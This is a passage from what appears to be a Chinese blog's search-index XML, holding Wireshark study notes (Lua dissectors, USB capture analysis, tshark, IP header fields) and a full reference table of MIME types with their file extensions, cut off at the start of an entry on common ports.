xx.png等文件</li><li>可在补充中找到base64解码后转文件的在线链接</li></ul></li><li>Word中的图片，如果想原版保存<ul><li>用压缩软件打开Word文件</li><li>找到需要的图片</li><li>解压缩，对图片进行其他操作</li><li>切记：不可以直接用Word打开然后复制出来，MD5会变</li></ul></li></ul><h4 id="19-在wireshark中添加新协议"><a href="#19-在wireshark中添加新协议" class="headerlink" title="19.在wireshark中添加新协议"></a>19.在wireshark中添加新协议</h4><h5 id="19-1-编程基础："><a href="#19-1-编程基础：" class="headerlink" title="19.1 编程基础："></a>19.1 编程基础：</h5><ul><li>wireshark编程、lua脚本语言</li></ul><h5 id="19-2-wireshark怎样判断数据包使用的协议？"><a href="#19-2-wireshark怎样判断数据包使用的协议？" class="headerlink" title="19.2 wireshark怎样判断数据包使用的协议？"></a>19.2 wireshark怎样判断数据包使用的协议？</h5><ul><li>视图 –&gt;  内部 –&gt;  解析器表（通过端口号进行）</li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/wireshark-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%A1%A8.png" alt=""></li></ul><h5 id="19-3-添加新协议的步骤（应用层）"><a href="#19-3-添加新协议的步骤（应用层）" class="headerlink" title="19.3 添加新协议的步骤（应用层）"></a>19.3 添加新协议的步骤（应用层）</h5><ul><li>添加新协议</li><li>添加解析器</li><li>注册（在wireshark中使协议对应端口号）</li></ul><h4 id="20-构造数据包的方法"><a href="#20-构造数据包的方法" class="headerlink" title="20.构造数据包的方法"></a>20.构造数据包的方法</h4><ul><li>xcap软件（精确到位）</li></ul><h4 id="21-分析USB数据"><a href="#21-分析USB数据" class="headerlink" title="21.分析USB数据"></a>21.分析USB数据</h4><ul><li>usb是三段式地址： <code>总线.设备.端口</code></li><li><a href="https://github.com/AngelKitty/UsbMiceDataHacker" target="_blank" rel="noopener">https://github.com/AngelKitty/UsbMiceDataHacker</a> </li><li><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html</a> </li></ul><h4 id="22-Tshark用法"><a href="#22-Tshark用法" class="headerlink" title="22.Tshark用法"></a>22.Tshark用法</h4><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/tshark用法.png" style="zoom:50%;" /><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><ul><li>maxmind（ip==&gt;地理位置）<ul><li><a href="https://dev.maxmind.com/geoip/" target="_blank" rel="noopener">https://dev.maxmind.com/geoip/</a> </li></ul></li><li>取证CTF：<ul><li><a href="http://forensicscontest.com/" target="_blank" rel="noopener">http://forensicscontest.com/</a> </li></ul></li><li>base64解密后转文件：<ul><li><a href="https://www.motobit.com/util/base64-decoder-encoder.asp" target="_blank" rel="noopener">https://www.motobit.com/util/base64-decoder-encoder.asp</a> </li></ul></li></ul><h4 id="IP协议的分析"><a href="#IP协议的分析" class="headerlink" title="IP协议的分析"></a>IP协议的分析</h4><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/ip协议.png" style="zoom:50%;" /><ul><li><p>版本：4位</p></li><li><p>首部长度：4位</p></li><li><p>服务类型：8位（1字节）</p></li><li><p>总长度（计数）：16位 （2字节）</p></li><li><p>identification标识：2字节（2字节）</p></li><li><p>flags标志：3位 </p></li><li><p>片位移：13位</p></li><li><p>生存时间：8位 （1字节）</p></li><li><p>协议类型：8位 （1字节）</p></li><li><p>首部校验和：16位（2字节）.</p></li><li><p>源地址：32位（4字节）</p></li><li><p>目的地址：32位 （4字节）</p></li><li><p>可选字段：可选，不固定，非必须</p><p>数据段：1480字节</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> WireShark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见MIME类型</title>
      <link href="/2020/03/26/chang-jian-mime-lei-xing/"/>
      <url>/2020/03/26/chang-jian-mime-lei-xing/</url>
      
        <content type="html"><![CDATA[<h4 id="常见MIME类型"><a href="#常见MIME类型" class="headerlink" title="常见MIME类型"></a>常见MIME类型</h4><ul><li><a href="https://www.w3school.com.cn/media/media_mimeref.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/media/media_mimeref.asp</a> </li></ul><table><thead><tr><th align="left">类型/子类型</th><th align="left">扩展名</th></tr></thead><tbody><tr><td align="left">application/envoy</td><td align="left">evy</td></tr><tr><td align="left">application/fractals</td><td align="left">fif</td></tr><tr><td align="left">application/futuresplash</td><td align="left">spl</td></tr><tr><td align="left">application/hta</td><td align="left">hta</td></tr><tr><td align="left">application/internet-property-stream</td><td align="left">acx</td></tr><tr><td align="left">application/mac-binhex40</td><td align="left">hqx</td></tr><tr><td align="left">application/msword</td><td align="left">doc</td></tr><tr><td align="left">application/msword</td><td align="left">dot</td></tr><tr><td align="left">application/octet-stream</td><td align="left">*</td></tr><tr><td align="left">application/octet-stream</td><td align="left">bin</td></tr><tr><td align="left">application/octet-stream</td><td align="left">class</td></tr><tr><td align="left">application/octet-stream</td><td align="left">dms</td></tr><tr><td align="left">application/octet-stream</td><td align="left">exe</td></tr><tr><td align="left">application/octet-stream</td><td align="left">lha</td></tr><tr><td align="left">application/octet-stream</td><td align="left">lzh</td></tr><tr><td align="left">application/oda</td><td align="left">oda</td></tr><tr><td align="left">application/olescript</td><td align="left">axs</td></tr><tr><td align="left">application/pdf</td><td align="left">pdf</td></tr><tr><td align="left">application/pics-rules</td><td align="left">prf</td></tr><tr><td align="left">application/pkcs10</td><td align="left">p10</td></tr><tr><td align="left">application/pkix-crl</td><td align="left">crl</td></tr><tr><td align="left">application/postscript</td><td align="left">ai</td></tr><tr><td align="left">application/postscript</td><td align="left">eps</td></tr><tr><td align="left">application/postscript</td><td align="left">ps</td></tr><tr><td align="left">application/rtf</td><td align="left">rtf</td></tr><tr><td align="left">application/set-payment-initiation</td><td align="left">setpay</td></tr><tr><td align="left">application/set-registration-initiation</td><td align="left">setreg</td></tr><tr><td align="left">application/vnd.ms-excel</td><td align="left">xla</td></tr><tr><td align="left">application/vnd.ms-excel</td><td align="left">xlc</td></tr><tr><td align="left">application/vnd.ms-excel</td><td align="left">xlm</td></tr><tr><td align="left">application/vnd.ms-excel</td><td align="left">xls</td></tr><tr><td align="left">application/vnd.ms-excel</td><td align="left">xlt</td></tr><tr><td align="left">application/vnd.ms-excel</td><td align="left">xlw</td></tr><tr><td align="left">application/vnd.ms-outlook</td><td align="left">msg</td></tr><tr><td align="left">application/vnd.ms-pkicertstore</td><td align="left">sst</td></tr><tr><td align="left">application/vnd.ms-pkiseccat</td><td align="left">cat</td></tr><tr><td align="left">application/vnd.ms-pkistl</td><td align="left">stl</td></tr><tr><td align="left">application/vnd.ms-powerpoint</td><td align="left">pot</td></tr><tr><td align="left">application/vnd.ms-powerpoint</td><td align="left">pps</td></tr><tr><td align="left">application/vnd.ms-powerpoint</td><td align="left">ppt</td></tr><tr><td align="left">application/vnd.ms-project</td><td align="left">mpp</td></tr><tr><td align="left">application/vnd.ms-works</td><td align="left">wcm</td></tr><tr><td align="left">application/vnd.ms-works</td><td align="left">wdb</td></tr><tr><td align="left">application/vnd.ms-works</td><td align="left">wks</td></tr><tr><td align="left">application/vnd.ms-works</td><td align="left">wps</td></tr><tr><td align="left">application/winhlp</td><td align="left">hlp</td></tr><tr><td align="left">application/x-bcpio</td><td align="left">bcpio</td></tr><tr><td align="left">application/x-cdf</td><td align="left">cdf</td></tr><tr><td align="left">application/x-compress</td><td align="left">z</td></tr><tr><td align="left">application/x-compressed</td><td align="left">tgz</td></tr><tr><td align="left">application/x-cpio</td><td align="left">cpio</td></tr><tr><td align="left">application/x-csh</td><td align="left">csh</td></tr><tr><td align="left">application/x-director</td><td align="left">dcr</td></tr><tr><td align="left">application/x-director</td><td align="left">dir</td></tr><tr><td align="left">application/x-director</td><td align="left">dxr</td></tr><tr><td align="left">application/x-dvi</td><td align="left">dvi</td></tr><tr><td align="left">application/x-gtar</td><td align="left">gtar</td></tr><tr><td align="left">application/x-gzip</td><td align="left">gz</td></tr><tr><td align="left">application/x-hdf</td><td align="left">hdf</td></tr><tr><td align="left">application/x-internet-signup</td><td align="left">ins</td></tr><tr><td align="left">application/x-internet-signup</td><td align="left">isp</td></tr><tr><td align="left">application/x-iphone</td><td align="left">iii</td></tr><tr><td align="left">application/x-javascript</td><td align="left">js</td></tr><tr><td align="left">application/x-latex</td><td align="left">latex</td></tr><tr><td align="left">application/x-msaccess</td><td align="left">mdb</td></tr><tr><td align="left">application/x-mscardfile</td><td align="left">crd</td></tr><tr><td align="left">application/x-msclip</td><td align="left">clp</td></tr><tr><td align="left">application/x-msdownload</td><td align="left">dll</td></tr><tr><td align="left">application/x-msmediaview</td><td align="left">m13</td></tr><tr><td align="left">application/x-msmediaview</td><td align="left">m14</td></tr><tr><td align="left">application/x-msmediaview</td><td align="left">mvb</td></tr><tr><td align="left">application/x-msmetafile</td><td align="left">wmf</td></tr><tr><td align="left">application/x-msmoney</td><td align="left">mny</td></tr><tr><td align="left">application/x-mspublisher</td><td align="left">pub</td></tr><tr><td align="left">application/x-msschedule</td><td align="left">scd</td></tr><tr><td align="left">application/x-msterminal</td><td align="left">trm</td></tr><tr><td align="left">application/x-mswrite</td><td align="left">wri</td></tr><tr><td align="left">application/x-netcdf</td><td align="left">cdf</td></tr><tr><td align="left">application/x-netcdf</td><td align="left">nc</td></tr><tr><td align="left">application/x-perfmon</td><td align="left">pma</td></tr><tr><td align="left">application/x-perfmon</td><td align="left">pmc</td></tr><tr><td align="left">application/x-perfmon</td><td align="left">pml</td></tr><tr><td align="left">application/x-perfmon</td><td align="left">pmr</td></tr><tr><td align="left">application/x-perfmon</td><td align="left">pmw</td></tr><tr><td align="left">application/x-pkcs12</td><td align="left">p12</td></tr><tr><td align="left">application/x-pkcs12</td><td align="left">pfx</td></tr><tr><td align="left">application/x-pkcs7-certificates</td><td align="left">p7b</td></tr><tr><td align="left">application/x-pkcs7-certificates</td><td align="left">spc</td></tr><tr><td align="left">application/x-pkcs7-certreqresp</td><td align="left">p7r</td></tr><tr><td align="left">application/x-pkcs7-mime</td><td align="left">p7c</td></tr><tr><td align="left">application/x-pkcs7-mime</td><td align="left">p7m</td></tr><tr><td align="left">application/x-pkcs7-signature</td><td align="left">p7s</td></tr><tr><td align="left">application/x-sh</td><td align="left">sh</td></tr><tr><td align="left">application/x-shar</td><td align="left">shar</td></tr><tr><td align="left">application/x-shockwave-flash</td><td align="left">swf</td></tr><tr><td align="left">application/x-stuffit</td><td align="left">sit</td></tr><tr><td align="left">application/x-sv4cpio</td><td align="left">sv4cpio</td></tr><tr><td align="left">application/x-sv4crc</td><td align="left">sv4crc</td></tr><tr><td align="left">application/x-tar</td><td align="left">tar</td></tr><tr><td align="left">application/x-tcl</td><td align="left">tcl</td></tr><tr><td align="left">application/x-tex</td><td align="left">tex</td></tr><tr><td align="left">application/x-texinfo</td><td align="left">texi</td></tr><tr><td align="left">application/x-texinfo</td><td align="left">texinfo</td></tr><tr><td align="left">application/x-troff</td><td align="left">roff</td></tr><tr><td align="left">application/x-troff</td><td align="left">t</td></tr><tr><td align="left">application/x-troff</td><td align="left">tr</td></tr><tr><td align="left">application/x-troff-man</td><td align="left">man</td></tr><tr><td align="left">application/x-troff-me</td><td align="left">me</td></tr><tr><td align="left">application/x-troff-ms</td><td align="left">ms</td></tr><tr><td align="left">application/x-ustar</td><td align="left">ustar</td></tr><tr><td align="left">application/x-wais-source</td><td align="left">src</td></tr><tr><td align="left">application/x-x509-ca-cert</td><td align="left">cer</td></tr><tr><td align="left">application/x-x509-ca-cert</td><td align="left">crt</td></tr><tr><td align="left">application/x-x509-ca-cert</td><td align="left">der</td></tr><tr><td align="left">application/ynd.ms-pkipko</td><td align="left">pko</td></tr><tr><td align="left">application/zip</td><td align="left">zip</td></tr><tr><td align="left">audio/basic</td><td align="left">au</td></tr><tr><td align="left">audio/basic</td><td align="left">snd</td></tr><tr><td align="left">audio/mid</td><td align="left">mid</td></tr><tr><td align="left">audio/mid</td><td align="left">rmi</td></tr><tr><td align="left">audio/mpeg</td><td align="left">mp3</td></tr><tr><td align="left">audio/x-aiff</td><td align="left">aif</td></tr><tr><td align="left">audio/x-aiff</td><td align="left">aifc</td></tr><tr><td align="left">audio/x-aiff</td><td align="left">aiff</td></tr><tr><td align="left">audio/x-mpegurl</td><td align="left">m3u</td></tr><tr><td align="left">audio/x-pn-realaudio</td><td align="left">ra</td></tr><tr><td align="left">audio/x-pn-realaudio</td><td align="left">ram</td></tr><tr><td align="left">audio/x-wav</td><td align="left">wav</td></tr><tr><td align="left">image/bmp</td><td align="left">bmp</td></tr><tr><td align="left">image/cis-cod</td><td align="left">cod</td></tr><tr><td align="left">image/gif</td><td align="left">gif</td></tr><tr><td align="left">image/ief</td><td align="left">ief</td></tr><tr><td align="left">image/jpeg</td><td align="left">jpe</td></tr><tr><td align="left">image/jpeg</td><td align="left">jpeg</td></tr><tr><td align="left">image/jpeg</td><td align="left">jpg</td></tr><tr><td align="left">image/pipeg</td><td align="left">jfif</td></tr><tr><td align="left">image/svg+xml</td><td align="left">svg</td></tr><tr><td align="left">image/tiff</td><td align="left">tif</td></tr><tr><td align="left">image/tiff</td><td align="left">tiff</td></tr><tr><td align="left">image/x-cmu-raster</td><td align="left">ras</td></tr><tr><td align="left">image/x-cmx</td><td align="left">cmx</td></tr><tr><td align="left">image/x-icon</td><td align="left">ico</td></tr><tr><td align="left">image/x-portable-anymap</td><td align="left">pnm</td></tr><tr><td align="left">image/x-portable-bitmap</td><td align="left">pbm</td></tr><tr><td align="left">image/x-portable-graymap</td><td align="left">pgm</td></tr><tr><td align="left">image/x-portable-pixmap</td><td align="left">ppm</td></tr><tr><td align="left">image/x-rgb</td><td align="left">rgb</td></tr><tr><td align="left">image/x-xbitmap</td><td align="left">xbm</td></tr><tr><td align="left">image/x-xpixmap</td><td align="left">xpm</td></tr><tr><td align="left">image/x-xwindowdump</td><td align="left">xwd</td></tr><tr><td align="left">message/rfc822</td><td align="left">mht</td></tr><tr><td align="left">message/rfc822</td><td align="left">mhtml</td></tr><tr><td align="left">message/rfc822</td><td align="left">nws</td></tr><tr><td align="left">text/css</td><td align="left">css</td></tr><tr><td align="left">text/h323</td><td align="left">323</td></tr><tr><td align="left">text/html</td><td align="left">htm</td></tr><tr><td align="left">text/html</td><td align="left">html</td></tr><tr><td align="left">text/html</td><td align="left">stm</td></tr><tr><td align="left">text/iuls</td><td align="left">uls</td></tr><tr><td align="left">text/plain</td><td align="left">bas</td></tr><tr><td align="left">text/plain</td><td align="left">c</td></tr><tr><td align="left">text/plain</td><td align="left">h</td></tr><tr><td align="left">text/plain</td><td align="left">txt</td></tr><tr><td align="left">text/richtext</td><td align="left">rtx</td></tr><tr><td align="left">text/scriptlet</td><td align="left">sct</td></tr><tr><td align="left">text/tab-separated-values</td><td align="left">tsv</td></tr><tr><td align="left">text/webviewhtml</td><td align="left">htt</td></tr><tr><td align="left">text/x-component</td><td align="left">htc</td></tr><tr><td align="left">text/x-setext</td><td align="left">etx</td></tr><tr><td align="left">text/x-vcard</td><td align="left">vcf</td></tr><tr><td align="left">video/mpeg</td><td align="left">mp2</td></tr><tr><td align="left">video/mpeg</td><td align="left">mpa</td></tr><tr><td align="left">video/mpeg</td><td align="left">mpe</td></tr><tr><td align="left">video/mpeg</td><td align="left">mpeg</td></tr><tr><td align="left">video/mpeg</td><td align="left">mpg</td></tr><tr><td align="left">video/mpeg</td><td align="left">mpv2</td></tr><tr><td align="left">video/quicktime</td><td align="left">mov</td></tr><tr><td align="left">video/quicktime</td><td align="left">qt</td></tr><tr><td align="left">video/x-la-asf</td><td align="left">lsf</td></tr><tr><td align="left">video/x-la-asf</td><td align="left">lsx</td></tr><tr><td align="left">video/x-ms-asf</td><td align="left">asf</td></tr><tr><td align="left">video/x-ms-asf</td><td align="left">asr</td></tr><tr><td align="left">video/x-ms-asf</td><td align="left">asx</td></tr><tr><td align="left">video/x-msvideo</td><td align="left">avi</td></tr><tr><td align="left">video/x-sgi-movie</td><td align="left">movie</td></tr><tr><td align="left">x-world/x-vrml</td><td align="left">flr</td></tr><tr><td align="left">x-world/x-vrml</td><td align="left">vrml</td></tr><tr><td align="left">x-world/x-vrml</td><td align="left">wrl</td></tr><tr><td align="left">x-world/x-vrml</td><td align="left">wrz</td></tr><tr><td align="left">x-world/x-vrml</td><td align="left">xaf</td></tr><tr><td align="left">x-world/x-vrml</td><td align="left">xof</td></tr></tbody></table><h2 id="按照文件扩展名排列的-Mime-类型列表"><a href="#按照文件扩展名排列的-Mime-类型列表" class="headerlink" title="按照文件扩展名排列的 Mime 类型列表"></a>按照文件扩展名排列的 Mime 类型列表</h2><table><thead><tr><th align="left">扩展名</th><th align="left">类型/子类型</th></tr></thead><tbody><tr><td align="left"></td><td align="left">application/octet-stream</td></tr><tr><td align="left">323</td><td align="left">text/h323</td></tr><tr><td align="left">acx</td><td align="left">application/internet-property-stream</td></tr><tr><td align="left">ai</td><td align="left">application/postscript</td></tr><tr><td align="left">aif</td><td align="left">audio/x-aiff</td></tr><tr><td align="left">aifc</td><td align="left">audio/x-aiff</td></tr><tr><td align="left">aiff</td><td align="left">audio/x-aiff</td></tr><tr><td align="left">asf</td><td align="left">video/x-ms-asf</td></tr><tr><td align="left">asr</td><td align="left">video/x-ms-asf</td></tr><tr><td align="left">asx</td><td align="left">video/x-ms-asf</td></tr><tr><td align="left">au</td><td align="left">audio/basic</td></tr><tr><td align="left">avi</td><td align="left">video/x-msvideo</td></tr><tr><td align="left">axs</td><td align="left">application/olescript</td></tr><tr><td align="left">bas</td><td align="left">text/plain</td></tr><tr><td align="left">bcpio</td><td align="left">application/x-bcpio</td></tr><tr><td align="left">bin</td><td align="left">application/octet-stream</td></tr><tr><td align="left">bmp</td><td align="left">image/bmp</td></tr><tr><td align="left">c</td><td align="left">text/plain</td></tr><tr><td align="left">cat</td><td align="left">application/vnd.ms-pkiseccat</td></tr><tr><td align="left">cdf</td><td align="left">application/x-cdf</td></tr><tr><td align="left">cer</td><td align="left">application/x-x509-ca-cert</td></tr><tr><td align="left">class</td><td align="left">application/octet-stream</td></tr><tr><td align="left">clp</td><td align="left">application/x-msclip</td></tr><tr><td align="left">cmx</td><td align="left">image/x-cmx</td></tr><tr><td align="left">cod</td><td align="left">image/cis-cod</td></tr><tr><td align="left">cpio</td><td align="left">application/x-cpio</td></tr><tr><td align="left">crd</td><td align="left">application/x-mscardfile</td></tr><tr><td align="left">crl</td><td align="left">application/pkix-crl</td></tr><tr><td align="left">crt</td><td align="left">application/x-x509-ca-cert</td></tr><tr><td align="left">csh</td><td align="left">application/x-csh</td></tr><tr><td align="left">css</td><td align="left">text/css</td></tr><tr><td align="left">dcr</td><td align="left">application/x-director</td></tr><tr><td align="left">der</td><td align="left">application/x-x509-ca-cert</td></tr><tr><td align="left">dir</td><td align="left">application/x-director</td></tr><tr><td align="left">dll</td><td align="left">application/x-msdownload</td></tr><tr><td align="left">dms</td><td align="left">application/octet-stream</td></tr><tr><td align="left">doc</td><td align="left">application/msword</td></tr><tr><td align="left">dot</td><td align="left">application/msword</td></tr><tr><td align="left">dvi</td><td align="left">application/x-dvi</td></tr><tr><td align="left">dxr</td><td align="left">application/x-director</td></tr><tr><td align="left">eps</td><td align="left">application/postscript</td></tr><tr><td align="left">etx</td><td align="left">text/x-setext</td></tr><tr><td align="left">evy</td><td align="left">application/envoy</td></tr><tr><td align="left">exe</td><td align="left">application/octet-stream</td></tr><tr><td align="left">fif</td><td align="left">application/fractals</td></tr><tr><td align="left">flr</td><td align="left">x-world/x-vrml</td></tr><tr><td align="left">gif</td><td align="left">image/gif</td></tr><tr><td align="left">gtar</td><td align="left">application/x-gtar</td></tr><tr><td align="left">gz</td><td align="left">application/x-gzip</td></tr><tr><td align="left">h</td><td align="left">text/plain</td></tr><tr><td align="left">hdf</td><td align="left">application/x-hdf</td></tr><tr><td align="left">hlp</td><td align="left">application/winhlp</td></tr><tr><td align="left">hqx</td><td align="left">application/mac-binhex40</td></tr><tr><td align="left">hta</td><td align="left">application/hta</td></tr><tr><td align="left">htc</td><td align="left">text/x-component</td></tr><tr><td align="left">htm</td><td align="left">text/html</td></tr><tr><td align="left">html</td><td align="left">text/html</td></tr><tr><td align="left">htt</td><td align="left">text/webviewhtml</td></tr><tr><td align="left">ico</td><td align="left">image/x-icon</td></tr><tr><td align="left">ief</td><td align="left">image/ief</td></tr><tr><td align="left">iii</td><td align="left">application/x-iphone</td></tr><tr><td align="left">ins</td><td align="left">application/x-internet-signup</td></tr><tr><td align="left">isp</td><td align="left">application/x-internet-signup</td></tr><tr><td align="left">jfif</td><td align="left">image/pipeg</td></tr><tr><td align="left">jpe</td><td align="left">image/jpeg</td></tr><tr><td align="left">jpeg</td><td align="left">image/jpeg</td></tr><tr><td align="left">jpg</td><td align="left">image/jpeg</td></tr><tr><td align="left">js</td><td align="left">application/x-javascript</td></tr><tr><td align="left">latex</td><td align="left">application/x-latex</td></tr><tr><td align="left">lha</td><td align="left">application/octet-stream</td></tr><tr><td align="left">lsf</td><td align="left">video/x-la-asf</td></tr><tr><td align="left">lsx</td><td align="left">video/x-la-asf</td></tr><tr><td align="left">lzh</td><td align="left">application/octet-stream</td></tr><tr><td align="left">m13</td><td align="left">application/x-msmediaview</td></tr><tr><td align="left">m14</td><td align="left">application/x-msmediaview</td></tr><tr><td align="left">m3u</td><td align="left">audio/x-mpegurl</td></tr><tr><td align="left">man</td><td align="left">application/x-troff-man</td></tr><tr><td align="left">mdb</td><td align="left">application/x-msaccess</td></tr><tr><td align="left">me</td><td align="left">application/x-troff-me</td></tr><tr><td align="left">mht</td><td align="left">message/rfc822</td></tr><tr><td align="left">mhtml</td><td align="left">message/rfc822</td></tr><tr><td align="left">mid</td><td align="left">audio/mid</td></tr><tr><td align="left">mny</td><td align="left">application/x-msmoney</td></tr><tr><td align="left">mov</td><td align="left">video/quicktime</td></tr><tr><td align="left">movie</td><td align="left">video/x-sgi-movie</td></tr><tr><td align="left">mp2</td><td align="left">video/mpeg</td></tr><tr><td align="left">mp3</td><td align="left">audio/mpeg</td></tr><tr><td align="left">mpa</td><td align="left">video/mpeg</td></tr><tr><td align="left">mpe</td><td align="left">video/mpeg</td></tr><tr><td align="left">mpeg</td><td align="left">video/mpeg</td></tr><tr><td align="left">mpg</td><td align="left">video/mpeg</td></tr><tr><td align="left">mpp</td><td align="left">application/vnd.ms-project</td></tr><tr><td align="left">mpv2</td><td align="left">video/mpeg</td></tr><tr><td align="left">ms</td><td align="left">application/x-troff-ms</td></tr><tr><td align="left">mvb</td><td align="left">application/x-msmediaview</td></tr><tr><td align="left">nws</td><td align="left">message/rfc822</td></tr><tr><td align="left">oda</td><td align="left">application/oda</td></tr><tr><td align="left">p10</td><td align="left">application/pkcs10</td></tr><tr><td align="left">p12</td><td align="left">application/x-pkcs12</td></tr><tr><td align="left">p7b</td><td align="left">application/x-pkcs7-certificates</td></tr><tr><td align="left">p7c</td><td align="left">application/x-pkcs7-mime</td></tr><tr><td align="left">p7m</td><td align="left">application/x-pkcs7-mime</td></tr><tr><td align="left">p7r</td><td align="left">application/x-pkcs7-certreqresp</td></tr><tr><td align="left">p7s</td><td align="left">application/x-pkcs7-signature</td></tr><tr><td align="left">pbm</td><td align="left">image/x-portable-bitmap</td></tr><tr><td align="left">pdf</td><td align="left">application/pdf</td></tr><tr><td align="left">pfx</td><td align="left">application/x-pkcs12</td></tr><tr><td align="left">pgm</td><td align="left">image/x-portable-graymap</td></tr><tr><td align="left">pko</td><td align="left">application/ynd.ms-pkipko</td></tr><tr><td align="left">pma</td><td align="left">application/x-perfmon</td></tr><tr><td align="left">pmc</td><td align="left">application/x-perfmon</td></tr><tr><td align="left">pml</td><td align="left">application/x-perfmon</td></tr><tr><td align="left">pmr</td><td align="left">application/x-perfmon</td></tr><tr><td align="left">pmw</td><td align="left">application/x-perfmon</td></tr><tr><td align="left">pnm</td><td align="left">image/x-portable-anymap</td></tr><tr><td align="left">pot,</td><td align="left">application/vnd.ms-powerpoint</td></tr><tr><td align="left">ppm</td><td align="left">image/x-portable-pixmap</td></tr><tr><td align="left">pps</td><td align="left">application/vnd.ms-powerpoint</td></tr><tr><td align="left">ppt</td><td align="left">application/vnd.ms-powerpoint</td></tr><tr><td align="left">prf</td><td align="left">application/pics-rules</td></tr><tr><td align="left">ps</td><td align="left">application/postscript</td></tr><tr><td align="left">pub</td><td align="left">application/x-mspublisher</td></tr><tr><td align="left">qt</td><td align="left">video/quicktime</td></tr><tr><td align="left">ra</td><td align="left">audio/x-pn-realaudio</td></tr><tr><td align="left">ram</td><td align="left">audio/x-pn-realaudio</td></tr><tr><td align="left">ras</td><td align="left">image/x-cmu-raster</td></tr><tr><td align="left">rgb</td><td align="left">image/x-rgb</td></tr><tr><td align="left">rmi</td><td align="left">audio/mid</td></tr><tr><td align="left">roff</td><td align="left">application/x-troff</td></tr><tr><td align="left">rtf</td><td align="left">application/rtf</td></tr><tr><td align="left">rtx</td><td align="left">text/richtext</td></tr><tr><td align="left">scd</td><td align="left">application/x-msschedule</td></tr><tr><td align="left">sct</td><td align="left">text/scriptlet</td></tr><tr><td align="left">setpay</td><td align="left">application/set-payment-initiation</td></tr><tr><td align="left">setreg</td><td align="left">application/set-registration-initiation</td></tr><tr><td align="left">sh</td><td align="left">application/x-sh</td></tr><tr><td align="left">shar</td><td align="left">application/x-shar</td></tr><tr><td align="left">sit</td><td align="left">application/x-stuffit</td></tr><tr><td align="left">snd</td><td align="left">audio/basic</td></tr><tr><td align="left">spc</td><td align="left">application/x-pkcs7-certificates</td></tr><tr><td align="left">spl</td><td align="left">application/futuresplash</td></tr><tr><td align="left">src</td><td align="left">application/x-wais-source</td></tr><tr><td align="left">sst</td><td align="left">application/vnd.ms-pkicertstore</td></tr><tr><td align="left">stl</td><td align="left">application/vnd.ms-pkistl</td></tr><tr><td align="left">stm</td><td align="left">text/html</td></tr><tr><td align="left">svg</td><td align="left">image/svg+xml</td></tr><tr><td align="left">sv4cpio</td><td align="left">application/x-sv4cpio</td></tr><tr><td align="left">sv4crc</td><td align="left">application/x-sv4crc</td></tr><tr><td align="left">swf</td><td align="left">application/x-shockwave-flash</td></tr><tr><td align="left">t</td><td align="left">application/x-troff</td></tr><tr><td align="left">tar</td><td align="left">application/x-tar</td></tr><tr><td align="left">tcl</td><td align="left">application/x-tcl</td></tr><tr><td align="left">tex</td><td align="left">application/x-tex</td></tr><tr><td align="left">texi</td><td align="left">application/x-texinfo</td></tr><tr><td align="left">texinfo</td><td align="left">application/x-texinfo</td></tr><tr><td align="left">tgz</td><td align="left">application/x-compressed</td></tr><tr><td align="left">tif</td><td align="left">image/tiff</td></tr><tr><td align="left">tiff</td><td align="left">image/tiff</td></tr><tr><td align="left">tr</td><td align="left">application/x-troff</td></tr><tr><td align="left">trm</td><td align="left">application/x-msterminal</td></tr><tr><td align="left">tsv</td><td align="left">text/tab-separated-values</td></tr><tr><td align="left">txt</td><td align="left">text/plain</td></tr><tr><td align="left">uls</td><td align="left">text/iuls</td></tr><tr><td align="left">ustar</td><td align="left">application/x-ustar</td></tr><tr><td align="left">vcf</td><td align="left">text/x-vcard</td></tr><tr><td align="left">vrml</td><td align="left">x-world/x-vrml</td></tr><tr><td align="left">wav</td><td align="left">audio/x-wav</td></tr><tr><td align="left">wcm</td><td align="left">application/vnd.ms-works</td></tr><tr><td align="left">wdb</td><td align="left">application/vnd.ms-works</td></tr><tr><td align="left">wks</td><td align="left">application/vnd.ms-works</td></tr><tr><td align="left">wmf</td><td align="left">application/x-msmetafile</td></tr><tr><td align="left">wps</td><td align="left">application/vnd.ms-works</td></tr><tr><td align="left">wri</td><td align="left">application/x-mswrite</td></tr><tr><td align="left">wrl</td><td align="left">x-world/x-vrml</td></tr><tr><td align="left">wrz</td><td align="left">x-world/x-vrml</td></tr><tr><td align="left">xaf</td><td align="left">x-world/x-vrml</td></tr><tr><td align="left">xbm</td><td align="left">image/x-xbitmap</td></tr><tr><td align="left">xla</td><td align="left">application/vnd.ms-excel</td></tr><tr><td align="left">xlc</td><td align="left">application/vnd.ms-excel</td></tr><tr><td align="left">xlm</td><td align="left">application/vnd.ms-excel</td></tr><tr><td align="left">xls</td><td align="left">application/vnd.ms-excel</td></tr><tr><td align="left">xlt</td><td align="left">application/vnd.ms-excel</td></tr><tr><td align="left">xlw</td><td align="left">application/vnd.ms-excel</td></tr><tr><td align="left">xof</td><td align="left">x-world/x-vrml</td></tr><tr><td align="left">xpm</td><td align="left">image/x-xpixmap</td></tr><tr><td align="left">xwd</td><td align="left">image/x-xwindowdump</td></tr><tr><td align="left">z</td><td align="left">application/x-compress</td></tr><tr><td align="left">zip</td><td align="left">application/zip</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> MIME </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1000个常用端口</title>
      <link href="/2020/03/26/1000-ge-chang-yong-duan-kou/"/>
      <url>/2020/03/26/1000-ge-chang-yong-duan-kou/</url>
      
